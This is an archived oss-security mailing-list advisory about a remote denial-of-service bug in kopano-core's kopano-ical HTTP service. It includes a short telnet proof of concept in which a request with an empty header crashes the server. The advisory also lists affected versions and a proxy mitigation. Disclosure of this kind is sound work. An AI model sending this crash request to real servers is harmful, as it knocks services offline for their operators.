X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["967" "Friday" "2" "April" "2021" "10:26:29" "+0200" "Jan Engelhardt" "jengelh@inai.de" nil "34" "[oss-security] kopano-core 11.0.1.77: Remote DoS with out-of-bounds access" nil nil nil "4" nil nil (number mark "U       jengelh@inai Apr  2   34/967   " thread-indent "\"[oss-security] kopano-core 11.0.1.77: Remote DoS with out-of-bounds access\"\n") nil nil nil nil nil nil nil nil nil "[oss-security] kopano-core 11.0.1.77: Remote DoS with out-of-bounds access" nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 5810 invoked by uid 550); 2 Apr 2021 10:20:27 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 30657 invoked from network); 2 Apr 2021 08:26:41 -0000
Date: Fri, 2 Apr 2021 10:26:29 +0200 (CEST)
From: Jan Engelhardt <jengelh@inai.de>
To: oss-security@lists.openwall.com
Message-ID: <op516nqr-96s1-3r69-4np9-314p89o96951@vanv.qr>
User-Agent: Alpine 2.24 (LSU 510 2020-10-10)
MIME-Version: 1.0
Content-Type: text/plain; charset=UTF-8
Content-Transfer-Encoding: 8BIT
Subject: [oss-security] kopano-core 11.0.1.77: Remote DoS with out-of-bounds access

Initial publication, no CVE number yet.

# Affected versions

  * kopano-core 11.0.1
  * kopano-core 8.7.20
  * it is believed this affects all other versions too,
    including 10.0.7, 9.1.0, and zarafa 7.2.6.

The "kopano-ical" program implements a network service/trivial HTTP 
server. It fails to properly check HTTP headers, and with a crafted 
request, can be exploited to drive the process into an exception and 
have it terminate.


# Trigger

» ./kopano-ical -F &
» telnet localhost 8000
Trying ::1...
Connected to localhost.
Escape character is '^]'.
GET / HTTP/1.0
Foo:
Connection closed by foreign host.
terminate called after throwing an instance of 'std::out_of_range'
  what():  basic_string::substr: __pos (which is 6) > this->size() (which is 5)


# Mitigation

In conjunction with a proxy, the issue does not occur as they often 
filter lines (LF->CRLF, giving an extra byte). Tested ones: 
nginx-1.19.8 squid-4.14 apache2-2.4.46 tinyproxy-1.10.0
